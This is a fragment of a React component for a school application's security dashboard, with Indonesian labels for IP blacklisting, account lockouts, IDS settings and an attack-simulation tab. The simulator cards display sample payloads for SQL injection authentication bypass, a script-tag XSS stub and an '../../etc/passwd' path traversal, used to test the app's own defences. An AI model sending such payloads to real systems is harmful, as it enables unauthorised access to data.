                        Terkunci sampai:{' '}
                        <span className="font-mono text-slate-600 dark:text-slate-300">
                          {new Date(lck.unlocksAt).toLocaleTimeString('id-ID')}
                        </span>{' '}
                        • IP: {lck.lastIp}
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleUnlockAccount(lck.username)}
                      className="px-3 py-1.5 text-xs font-bold bg-white dark:bg-slate-800 hover:bg-emerald-500 hover:text-white text-emerald-600 dark:text-emerald-400 border border-emerald-300 dark:border-emerald-700/60 rounded-xl transition flex items-center gap-1 shadow-xs shrink-0"
                    >
                      <Unlock className="w-3.5 h-3.5" />
                      <span>Buka Kunci</span>
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* BLOCKED IPS SECTION */}
          <div className="p-5 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs space-y-4">
            <div className="flex items-center justify-between border-b border-slate-100 dark:border-slate-800 pb-3">
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 rounded-xl bg-rose-100 dark:bg-rose-950/60 text-rose-600 flex items-center justify-center font-bold">
                  <Ban className="w-4 h-4" />
                </div>
                <div>
                  <h3 className="font-bold text-sm text-slate-800 dark:text-slate-100">IP Blacklist / Firewall Block</h3>
                  <p className="text-[11px] text-slate-400">Alamat IP yang diblokir aksesnya ke seluruh endpoint aplikasi.</p>
                </div>
              </div>
              <button
                type="button"
                onClick={() => {
                  setManualIpInput('');
                  setManualReasonInput('');
                  setShowManualBlockModal(true);
                }}
                className="px-2.5 py-1 text-xs font-bold rounded-lg bg-rose-600 text-white hover:bg-rose-500 transition"
              >
                + Tambah IP
              </button>
            </div>

            {blockedIps.length === 0 ? (
              <div className="p-8 text-center text-slate-400 text-xs">
                <CheckCircle2 className="w-8 h-8 mx-auto text-emerald-500 mb-1 opacity-70" />
                Tidak ada IP dalam daftar blacklist.
              </div>
            ) : (
              <div className="space-y-3">
                {blockedIps.map((blk) => (
                  <div
                    key={blk.id}
                    className="p-3.5 rounded-xl border border-rose-200 dark:border-rose-900/40 bg-rose-50/50 dark:bg-rose-950/20 flex items-center justify-between gap-3"
                  >
                    <div>
                      <div className="font-bold text-slate-800 dark:text-white flex items-center gap-2">
                        <span className="font-mono text-xs text-rose-700 dark:text-rose-400">{blk.ip}</span>
                        <span className="text-[10px] px-2 py-0.5 rounded-full bg-rose-200 dark:bg-rose-900/60 text-rose-800 dark:text-rose-300 font-bold">
                          {blk.blockedBy}
                        </span>
                      </div>
                      <div className="text-[11px] text-slate-500 dark:text-slate-400 mt-1">{blk.reason}</div>
                      <div className="text-[10px] text-slate-400 mt-0.5">Diblokir pada: {blk.blockedAt}</div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleUnblockIp(blk.id, blk.ip)}
                      className="px-3 py-1.5 text-xs font-bold bg-white dark:bg-slate-800 hover:bg-slate-100 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-300 border border-slate-200 dark:border-slate-700 rounded-xl transition shrink-0"
                    >
                      Buka Blokir
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 3: SIMULATION SANDBOX */}
      {activeTab === 'simulation' && (
        <div className="space-y-6">
          <div className="p-5 rounded-2xl bg-indigo-500/10 border border-indigo-500/20 flex flex-col md:flex-row items-center justify-between gap-4">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-2xl bg-indigo-600 text-white flex items-center justify-center font-bold shrink-0">
                <Zap className="w-5 h-5" />
              </div>
              <div>
                <h3 className="font-bold text-sm text-slate-900 dark:text-white">Interactive Attack Simulator (IDS Sandbox)</h3>
                <p className="text-xs text-slate-600 dark:text-slate-300">
                  Uji ketangguhan deteksi intrusi dan Web Application Firewall aplikasi dengan simulasi serangan siber nyata.
                </p>
              </div>
            </div>
            {isSimulating && (
              <div className="flex items-center gap-2 text-xs font-bold text-indigo-600 dark:text-indigo-400 bg-white dark:bg-slate-800 px-3 py-1.5 rounded-xl border border-indigo-200 dark:border-indigo-800 shadow-xs">
                <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                <span>Menjalankan IDS Engine...</span>
              </div>
            )}
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {/* Simulation 1: Brute Force */}
            <div className="p-5 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs flex flex-col justify-between space-y-4">
              <div>
                <div className="flex items-center justify-between">
                  <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-amber-500/10 text-amber-600 uppercase">
                    Severity: High
                  </span>
                  <Flame className="w-4 h-4 text-amber-500" />
                </div>
                <h4 className="font-bold text-sm text-slate-800 dark:text-slate-100 mt-2">1. Brute Force Login Attack</h4>
                <p className="text-xs text-slate-500 mt-1">
                  Mensimulasikan upaya serangan kamus kata sandi (dictionary attack) cepat 6 kali berturut-turut pada akun administrator.
                </p>
                <div className="mt-3 p-2.5 rounded-xl bg-slate-50 dark:bg-slate-800/60 font-mono text-[10px] text-slate-600 dark:text-slate-400">
                  Target: admin / Wordlist: 6 passwords
                </div>
              </div>
              <button
                type="button"
                disabled={isSimulating}
                onClick={() => runSimulation('brute_force')}
                className="w-full py-2 bg-amber-600 hover:bg-amber-500 text-white font-bold text-xs rounded-xl shadow-xs transition cursor-pointer"
              >
                Uji Brute Force Attack
              </button>
            </div>

            {/* Simulation 2: SQL Injection */}
            <div className="p-5 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs flex flex-col justify-between space-y-4">
              <div>
                <div className="flex items-center justify-between">
                  <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-rose-500/10 text-rose-600 uppercase">
                    Severity: Critical
                  </span>
                  <Terminal className="w-4 h-4 text-rose-500" />
                </div>
                <h4 className="font-bold text-sm text-slate-800 dark:text-slate-100 mt-2">2. SQL Injection Authentication Bypass</h4>
                <p className="text-xs text-slate-500 mt-1">
                  Mensimulasikan injeksi karakter meta SQL kueri (`' OR '1'='1`) untuk menguji deteksi WAF pada form autentikasi.
                </p>
                <div className="mt-3 p-2.5 rounded-xl bg-slate-50 dark:bg-slate-800/60 font-mono text-[10px] text-slate-600 dark:text-slate-400">
                  Payload: admin&apos; OR &apos;1&apos;=&apos;1&apos;--
                </div>
              </div>
              <button
                type="button"
                disabled={isSimulating}
                onClick={() => runSimulation('sqli')}
                className="w-full py-2 bg-rose-600 hover:bg-rose-500 text-white font-bold text-xs rounded-xl shadow-xs transition cursor-pointer"
              >
                Uji Injeksi SQL (WAF)
              </button>
            </div>

            {/* Simulation 3: XSS */}
            <div className="p-5 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs flex flex-col justify-between space-y-4">
              <div>
                <div className="flex items-center justify-between">
                  <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-blue-500/10 text-blue-600 uppercase">
                    Severity: High
                  </span>
                  <Globe className="w-4 h-4 text-blue-500" />
                </div>
                <h4 className="font-bold text-sm text-slate-800 dark:text-slate-100 mt-2">3. Cross-Site Scripting (XSS)</h4>
                <p className="text-xs text-slate-500 mt-1">
                  Mensimulasikan injeksi tag skrip berbahaya (`&lt;script&gt;`) pada input field data siswa/presensi.
                </p>
                <div className="mt-3 p-2.5 rounded-xl bg-slate-50 dark:bg-slate-800/60 font-mono text-[10px] text-slate-600 dark:text-slate-400">
                  Payload: &lt;script&gt;fetch(&quot;...&quot;)&lt;/script&gt;
                </div>
              </div>
              <button
                type="button"
                disabled={isSimulating}
                onClick={() => runSimulation('xss')}
                className="w-full py-2 bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs rounded-xl shadow-xs transition cursor-pointer"
              >
                Uji XSS Payload
              </button>
            </div>

            {/* Simulation 4: Night Anomaly */}
            <div className="p-5 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs flex flex-col justify-between space-y-4">
              <div>
                <div className="flex items-center justify-between">
                  <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-indigo-500/10 text-indigo-600 uppercase">
                    Severity: Medium
                  </span>
                  <Clock className="w-4 h-4 text-indigo-500" />
                </div>
                <h4 className="font-bold text-sm text-slate-800 dark:text-slate-100 mt-2">4. Anomali Waktu Akses (Dini Hari)</h4>
                <p className="text-xs text-slate-500 mt-1">
                  Mensimulasikan login di luar jam aktif sekolah (pukul 23:00 - 05:00 WIB) untuk menguji deteksi anomali perilaku pengguna.
                </p>
                <div className="mt-3 p-2.5 rounded-xl bg-slate-50 dark:bg-slate-800/60 font-mono text-[10px] text-slate-600 dark:text-slate-400">
                  Waktu Terdeteksi: 03:12 WIB (Off-Hours)
                </div>
              </div>
              <button
                type="button"
                disabled={isSimulating}
                onClick={() => runSimulation('night_anomaly')}
                className="w-full py-2 bg-indigo-600 hover:bg-indigo-500 text-white font-bold text-xs rounded-xl shadow-xs transition cursor-pointer"
              >
                Uji Anomali Waktu
              </button>
            </div>

            {/* Simulation 5: Path Traversal */}
            <div className="p-5 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs flex flex-col justify-between space-y-4">
              <div>
                <div className="flex items-center justify-between">
                  <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-rose-500/10 text-rose-600 uppercase">
                    Severity: Critical
                  </span>
                  <Server className="w-4 h-4 text-rose-500" />
                </div>
                <h4 className="font-bold text-sm text-slate-800 dark:text-slate-100 mt-2">5. Directory Path Traversal & Auto-Ban</h4>
                <p className="text-xs text-slate-500 mt-1">
                  Mensimulasikan penyerang yang mencoba membaca file sistem (`../../etc/passwd`) dan menguji fitur pemblokiran IP otomatis.
                </p>
                <div className="mt-3 p-2.5 rounded-xl bg-slate-50 dark:bg-slate-800/60 font-mono text-[10px] text-slate-600 dark:text-slate-400">
                  Mitigasi: Otomatis Tambah IP ke Blacklist
                </div>
              </div>
              <button
                type="button"
                disabled={isSimulating}
                onClick={() => runSimulation('path_traversal')}
                className="w-full py-2 bg-rose-700 hover:bg-rose-600 text-white font-bold text-xs rounded-xl shadow-xs transition cursor-pointer"
              >
                Uji Path Traversal & Auto-Ban
              </button>
            </div>
          </div>
        </div>
      )}

      {/* TAB 4: CONFIGURATION & POLICIES */}
      {activeTab === 'config' && (
        <form onSubmit={handleSaveConfig} className="p-6 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 shadow-xs space-y-6">
          <div className="border-b border-slate-100 dark:border-slate-800 pb-4">
            <h3 className="font-bold text-base text-slate-800 dark:text-white">Kebijakan Pertahanan & Ambang Batas IDS</h3>
            <p className="text-xs text-slate-500 mt-1">
              Atur parameter sensitivitas deteksi, aturan penguncian akun otomatis, dan filter firewall aplikasi.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* IDS Master Switch */}
            <div className="p-4 rounded-xl border border-slate-200 dark:border-slate-700 bg-slate-50/50 dark:bg-slate-800/40 space-y-2">
              <label className="flex items-center justify-between cursor-pointer">
                <div>
                  <div className="font-bold text-xs text-slate-800 dark:text-white">Aktifkan IDS Engine Real-time</div>
                  <div className="text-[11px] text-slate-500">Memeriksa setiap request login dan input form secara aktif.</div>
                </div>
                <input
                  type="checkbox"
                  checked={tempConfig.idsEnabled}
                  onChange={(e) => setTempConfig({ ...tempConfig, idsEnabled: e.target.checked })}
                  className="w-4 h-4 text-indigo-600 rounded-sm focus:ring-indigo-500"
                />
              </label>
            </div>

            {/* Strict WAF Inspection */}
            <div className="p-4 rounded-xl border border-slate-200 dark:border-slate-700 bg-slate-50/50 dark:bg-slate-800/40 space-y-2">
              <label className="flex items-center justify-between cursor-pointer">
                <div>
                  <div className="font-bold text-xs text-slate-800 dark:text-white">Inspeksi Ketat WAF (SQLi / XSS)</div>
                  <div className="text-[11px] text-slate-500">Memindai karakter injeksi berbahaya pada setiap input data.</div>
                </div>
                <input
                  type="checkbox"
                  checked={tempConfig.strictWafInspection}
                  onChange={(e) => setTempConfig({ ...tempConfig, strictWafInspection: e.target.checked })}
                  className="w-4 h-4 text-indigo-600 rounded-sm focus:ring-indigo-500"
                />
              </label>
            </div>

            {/* Max Failed Attempts */}
            <div className="space-y-1.5">
              <label className="text-xs font-bold text-slate-700 dark:text-slate-300">
                Batas Maksimal Percobaan Login Gagal
              </label>
              <div className="flex items-center gap-2">
                <input
                  type="number"
                  min="2"
                  max="20"
                  value={tempConfig.maxFailedLoginAttempts}
                  onChange={(e) =>
                    setTempConfig({ ...tempConfig, maxFailedLoginAttempts: parseInt(e.target.value) || 5 })
                  }
                  className="w-full px-3 py-2 text-xs rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-800 dark:text-slate-100 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                />
                <span className="text-xs text-slate-500 whitespace-nowrap">kali berturut-turut</span>
              </div>
              <p className="text-[10px] text-slate-400">Jika terlampaui, akun akan otomatis dikunci sementara.</p>
            </div>

            {/* Lockout Duration */}
            <div className="space-y-1.5">
              <label className="text-xs font-bold text-slate-700 dark:text-slate-300">
                Durasi Penguncian Akun (Lockout)
              </label>
              <div className="flex items-center gap-2">
                <input
                  type="number"
                  min="1"
                  max="1440"
                  value={tempConfig.lockoutDurationMinutes}
                  onChange={(e) =>
                    setTempConfig({ ...tempConfig, lockoutDurationMinutes: parseInt(e.target.value) || 15 })
                  }
                  className="w-full px-3 py-2 text-xs rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-800 dark:text-slate-100 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                />
                <span className="text-xs text-slate-500 whitespace-nowrap">menit</span>
              </div>
              <p className="text-[10px] text-slate-400">Akun akan otomatis dibuka kembali setelah durasi ini berakhir.</p>
            </div>

            {/* Auto Ban Malicious IP */}
            <div className="p-4 rounded-xl border border-slate-200 dark:border-slate-700 bg-slate-50/50 dark:bg-slate-800/40 space-y-2">
              <label className="flex items-center justify-between cursor-pointer">
                <div>
                  <div className="font-bold text-xs text-slate-800 dark:text-white">Auto-Ban IP Berbahaya (Blacklist Otomatis)</div>
                  <div className="text-[11px] text-slate-500">Memblokir langsung IP yang terdeteksi melakukan exploitasi kritis.</div>
                </div>
                <input
                  type="checkbox"
                  checked={tempConfig.autoBanMaliciousIps}
                  onChange={(e) => setTempConfig({ ...tempConfig, autoBanMaliciousIps: e.target.checked })}
                  className="w-4 h-4 text-indigo-600 rounded-sm focus:ring-indigo-500"
                />
              </label>
            </div>

            {/* Night Anomaly Alert */}
            <div className="p-4 rounded-xl border border-slate-200 dark:border-slate-700 bg-slate-50/50 dark:bg-slate-800/40 space-y-2">
              <label className="flex items-center justify-between cursor-pointer">
                <div>
                  <div className="font-bold text-xs text-slate-800 dark:text-white">Peringatan Login Dini Hari (Off-Hours)</div>
                  <div className="text-[11px] text-slate-500">Mencatat peringatan saat ada aktivitas login antara 23:00 - 05:00 WIB.</div>
                </div>
                <input
                  type="checkbox"
                  checked={tempConfig.nightAnomalyAlertEnabled}
                  onChange={(e) => setTempConfig({ ...tempConfig, nightAnomalyAlertEnabled: e.target.checked })}
                  className="w-4 h-4 text-indigo-600 rounded-sm focus:ring-indigo-500"
                />
              </label>
            </div>
          </div>

          <div className="flex justify-end pt-4 border-t border-slate-100 dark:border-slate-800">
            <button
              type="submit"
              className="px-6 py-2.5 bg-indigo-600 hover:bg-indigo-700 text-white font-bold text-xs rounded-xl shadow-md shadow-indigo-600/20 transition cursor-pointer"
            >
              Simpan Konfigurasi Kebijakan
            </button>
          </div>
        </form>
      )}

      {/* DETAIL INCIDENT MODAL */}
      {selectedIncident && (
        <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-xs flex items-center justify-center p-4 animate-in fade-in">
          <div className="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-3xl p-6 max-w-xl w-full shadow-2xl space-y-4">
            <div className="flex items-center justify-between border-b border-slate-100 dark:border-slate-800 pb-3">
              <div className="flex items-center gap-2">
                <ShieldAlert className="w-5 h-5 text-indigo-600" />
                <h3 className="font-bold text-sm text-slate-800 dark:text-white">Detail Forensik Insiden Keamanan</h3>
              </div>
              <button
                type="button"
                onClick={() => setSelectedIncident(null)}
                className="p-1 rounded-lg text-slate-400 hover:text-slate-600 dark:hover:text-slate-200"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="space-y-3 text-xs">
              <div className="flex justify-between items-center bg-slate-50 dark:bg-slate-800/60 p-3 rounded-xl">
                <div>
                  <div className="text-[10px] text-slate-400 font-bold uppercase">Waktu Terdeteksi</div>
                  <div className="font-mono text-slate-700 dark:text-slate-200 font-bold">{selectedIncident.formattedTime}</div>
                </div>
                <div>{getSeverityBadge(selectedIncident.severity)}</div>
              </div>

              <div>
                <div className="text-[10px] text-slate-400 font-bold uppercase">Judul & Deskripsi</div>
                <div className="font-bold text-slate-800 dark:text-white text-sm mt-0.5">{selectedIncident.title}</div>
                <p className="text-slate-600 dark:text-slate-300 mt-1">{selectedIncident.description}</p>
              </div>

              <div className="grid grid-cols-2 gap-3 bg-slate-50 dark:bg-slate-800/40 p-3 rounded-xl">
                <div>
                  <div className="text-[10px] text-slate-400 font-bold uppercase">Target Akun</div>
                  <div className="font-mono font-bold text-slate-700 dark:text-slate-200 mt-0.5">
                    {selectedIncident.targetUsername || '-'}
                  </div>
                </div>
                <div>
                  <div className="text-[10px] text-slate-400 font-bold uppercase">Alamat IP & Lokasi</div>
                  <div className="font-mono font-bold text-slate-700 dark:text-slate-200 mt-0.5">
                    {selectedIncident.ipAddress} ({selectedIncident.locationEstimate || 'ID'})
                  </div>
                </div>
              </div>

              {selectedIncident.payloadSnippet && (
                <div>
                  <div className="text-[10px] text-slate-400 font-bold uppercase mb-1">Snippet Payload / Signature Terdeteksi</div>
                  <pre className="p-3 rounded-xl bg-slate-900 text-emerald-400 font-mono text-[11px] overflow-x-auto whitespace-pre-wrap">
                    {selectedIncident.payloadSnippet}
                  </pre>
                </div>
              )}

              {selectedIncident.userAgent && (
                <div>
                  <div className="text-[10px] text-slate-400 font-bold uppercase">User Agent Client</div>
                  <div className="text-[11px] font-mono text-slate-500 bg-slate-100 dark:bg-slate-800 p-2 rounded-lg break-all">
                    {selectedIncident.userAgent}
                  </div>
                </div>
              )}
            </div>

            <div className="flex justify-end gap-2 pt-3 border-t border-slate-100 dark:border-slate-800">
              <button
                type="button"
                onClick={() => setSelectedIncident(null)}
                className="px-4 py-2 text-xs font-bold bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-300 rounded-xl"
              >
                Tutup
              </button>
              {selectedIncident.status !== 'resolved' && (
                <button
                  type="button"
                  onClick={() => {
                    handleResolveIncident(selectedIncident.id);
                    setSelectedIncident(null);
                  }}
                  className="px-4 py-2 text-xs font-bold bg-emerald-600 hover:bg-emerald-500 text-white rounded-xl"
                >
                  Tandai Selesai (Resolved)
                </button>
              )}
            </div>
          </div>
        </div>
      )}

      {/* MANUAL BLOCK IP MODAL */}
      {showManualBlockModal && (
        <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-xs flex items-center justify-center p-4 animate-in fade-in">
          <div className="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-3xl p-6 max-w-sm w-full shadow-2xl space-y-4">
            <div className="flex items-center justify-between border-b border-slate-100 dark:border-slate-800 pb-3">
              <h3 className="font-bold text-sm text-slate-800 dark:text-white flex items-center gap-2">
                <Ban className="w-4 h-4 text-rose-600" />
                <span>Tambah IP ke Blacklist</span>
              </h3>
              <button
                type="button"
                onClick={() => setShowManualBlockModal(false)}
                className="text-slate-400 hover:text-slate-600"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="space-y-3 text-xs">
              <div className="space-y-1">
                <label className="font-bold text-slate-700 dark:text-slate-300">Alamat IP Target</label>
                <input
                  type="text"
                  placeholder="Contoh: 182.253.140.22"
                  value={manualIpInput}
                  onChange={(e) => setManualIpInput(e.target.value)}
                  className="w-full px-3 py-2 text-xs rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-800 dark:text-slate-100 font-mono focus:outline-none focus:ring-2 focus:ring-rose-500"
                />
              </div>

              <div className="space-y-1">
                <label className="font-bold text-slate-700 dark:text-slate-300">Alasan Pemblokiran</label>
                <input
                  type="text"
                  placeholder="Contoh: Terdeteksi bot scan / IP mencurigakan"
                  value={manualReasonInput}
                  onChange={(e) => setManualReasonInput(e.target.value)}
                  className="w-full px-3 py-2 text-xs rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-200 dark:border-slate-700 text-slate-800 dark:text-slate-100 focus:outline-none focus:ring-2 focus:ring-rose-500"
                />
              </div>
            </div>

            <div className="flex justify-end gap-2 pt-2">
              <button
                type="button"
                onClick={() => setShowManualBlockModal(false)}
                className="px-3 py-2 text-xs font-bold rounded-xl bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-300"
              >
                Batal
              </button>
              <button
                type="button"
                onClick={() => {
                  if (!manualIpInput.trim()) {
                    onShowToast('Masukkan alamat IP yang valid.', 'warning');
                    return;
                  }
                  handleBlockIp(manualIpInput.trim(), manualReasonInput.trim());
                  setShowManualBlockModal(false);
                }}
                className="px-4 py-2 text-xs font-bold rounded-xl bg-rose-600 hover:bg-rose-500 text-white shadow-md shadow-rose-600/20"
              >
                Blokir IP Sekarang
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
